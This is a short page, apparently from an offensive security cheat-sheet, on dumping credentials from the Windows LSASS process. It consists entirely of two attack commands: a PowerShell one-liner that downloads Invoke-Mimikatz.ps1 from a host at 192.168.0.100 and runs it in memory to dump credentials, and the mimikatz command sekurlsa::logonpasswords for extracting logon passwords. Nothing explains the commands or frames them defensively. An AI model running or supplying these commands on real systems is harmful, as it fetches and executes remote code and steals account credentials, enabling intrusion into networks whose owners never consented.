---
description: LSASS (Local Security Authority Subsystem Service)
---

# LSASS

{% code overflow="wrap" %}
```powershell
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.0.100/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```
{% endcode %}

```
mimikatz # sekurlsa:logonpasswords
```
